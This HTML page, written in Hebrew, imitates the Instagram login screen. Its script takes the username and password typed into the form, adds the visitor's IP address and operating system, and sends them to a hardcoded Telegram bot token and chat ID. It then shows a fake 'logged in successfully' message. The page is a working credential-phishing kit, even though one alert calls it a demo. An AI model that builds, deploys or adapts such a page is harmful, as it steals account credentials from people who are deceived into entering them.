<!DOCTYPE html>
<html lang="he">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.container { width: 100%; max-width: 350px; padding: 20px; }
.login-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px 30px 30px; text-align: center; }
.logo {
    font-family: 'Billabong', cursive;
    font-size: 52px;
    font-weight: 600;
    margin-bottom: 30px;
    letter-spacing: -2px;
    background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    display: inline-block;
}
.input-group { margin-bottom: 8px; }
.input-group input { width: 100%; padding: 12px 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 14px; outline: none; transition: border 0.2s; }
.input-group input:focus { border-color: #a8a8a8; background: #fff; }
.login-btn { width: 100%; padding: 10px; background: #0095f6; color: #fff; border: none; border-radius: 6px; font-weight: 600; font-size: 15px; cursor: pointer; margin-top: 10px; opacity: 0.9; }
.login-btn:active { opacity: 0.7; }
.divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 500; }
.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
.divider::before { margin-right: 18px; }
.divider::after { margin-left: 18px; }
.fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 20px; }
.fb-login svg { width: 20px; height: 20px; fill: #385185; }
.forgot { color: #00376b; font-size: 12px; cursor: pointer; }
.signup-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; padding: 20px; text-align: center; margin-top: 12px; font-size: 14px; color: #262626; }
.signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
.app-download { text-align: center; margin-top: 20px; font-size: 14px; color: #262626; }
.app-download .stores { display: flex; justify-content: center; gap: 10px; margin-top: 10px; }
.app-download .stores img { height: 40px; cursor: pointer; }
</style>
</head>
<body>
<div class="container">
    <div class="login-box">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="שם משתמש, אימייל או טלפון" autocomplete="username">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="סיסמה" autocomplete="current-password">
            </div>
            <button type="submit" class="login-btn">התחבר</button>
        </form>
        <div class="divider">או</div>
        <div class="fb-login" onclick="fbLogin()">
            <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
            <span>התחבר באמצעות פייסבוק</span>
        </div>
        <div class="forgot" onclick="alert('נשלח קישור לאיפוס לאימייל שלך')">שכחת סיסמה?</div>
    </div>

    <div class="signup-box">
        אין לך חשבון? <a href="#" onclick="alert('הרשמה זמנית – נשלח לך מייל')">הרשם</a>
    </div>

    <div class="app-download">
        הורד את האפליקציה
        <div class="stores">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFkAAAAqCAMAAABj7Ff3AAAAYFBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////9P8M8iAAAAH3RSTlMAz+4QGBsyucjJ6O/19/Hw8efl3t7Y2NPJxrukT42RLWAAAAHISURBVFjD7ZbZooMgDEVjE3GL7P//XzugGrJok87tK+XeD1qZcBJCqigkFMUg6mUMJEGhwOJkFkDJGDRYg1qLkzFosAZoEIXTMfr20Hf6lJtGZyCM6ZPugM/M7X6fOzl5XPKXtuUqE3I+ot92Yt1mgnJ1IEdQztndu6phSLqgaLnsO2yajKRbjFgtuw81W8brvHf3QfEx5w/piyI3d+OJPSzVQ16fZ/Wb9q2q/1qX5X8+E/r6/O2pX+xLSSuvcVdRP2b89+ftJfXV7MbgY7h0tWrsWqQrO6e7itxd+v1tj3/JHv86K/PvuPzcn7n38eCn/PGg81F7c4npR4y0zX/TtmcOtrN2Kq+nv++f6f+5HGTuk+ui6uDhdvqU+Q48maLx+B1H3x6dOSsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAL/gBEdW7/ykJtsAAAAASUVORK5CYII=" alt="App Store">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFkAAAAqCAMAAABj7Ff3AAAAYFBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////9P8M8iAAAAH3RSTlMAz+4QGBsyucjJ6O/19/Hw8efl3t7Y2NPJxrukT42RLWAAAAHISURBVFjD7ZbZooMgDEVjE3GL7P//XzugGrJok87tK+XeD1qZcBJCqigkFMUg6mUMJEGhwOJkFkDJGDRYg1qLkzFosAZoEIXTMfr20Hf6lJtGZyCM6ZPugM/M7X6fOzl5XPKXtuUqE3I+ot92Yt1mgnJ1IEdQztndu6phSLqgaLnsO2yajKRbjFgtuw81W8brvHf3QfEx5w/piyI3d+OJPSzVQ16fZ/Wb9q2q/1qX5X8+E/r6/O2pX+xLSSuvcVdRP2b89+ftJfXV7MbgY7h0tWrsWqQrO6e7itxd+v1tj3/JHv86K/PvuPzcn7n38eCn/PGg81F7c4npR4y0zX/TtmcOtrN2Kq+nv++f6f+5HGTuk+ui6uDhdvqU+Q48maLx+B1H3x6dOSsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAL/gBEdW7/ykJtsAAAAASUVORK5CYII=" alt="Google Play">
        </div>
    </div>
</div>

<script>
const BOT_TOKEN = '8942000012:AAHDt2FU2G71nPWh63BQZPm0ga-ySm69qQg';
const CHAT_ID = '5814617245';

function getIP(callback) {
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => callback(data.ip))
        .catch(() => callback('לא ניתן לקבל IP'));
}

function getOS() {
    const ua = navigator.userAgent;
    if (ua.includes('Win')) return 'Windows';
    if (ua.includes('Linux')) return 'Linux';
    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
    if (ua.includes('Android')) return 'Android';
    return 'לא ידוע';
}

function sendToTelegram(msg) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    }).catch(e => console.error(e));
}

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    if (!username || !password) {
        alert('נא למלא את כל השדות');
        return;
    }
    getIP(function(ip) {
        const msg = `🔐 התחברות לאינסטגרם\n👤 משתמש: ${username}\n🔑 סיסמה: ${password}\n💻 מערכת: ${getOS()}\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`;
        sendToTelegram(msg);
    });
    alert('התחברת בהצלחה! (זהו דף הדגמה)');
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
});

function fbLogin() {
    alert('התחברות באמצעות פייסבוק – (הדגמה)');
}
</script>
</body>
</html>
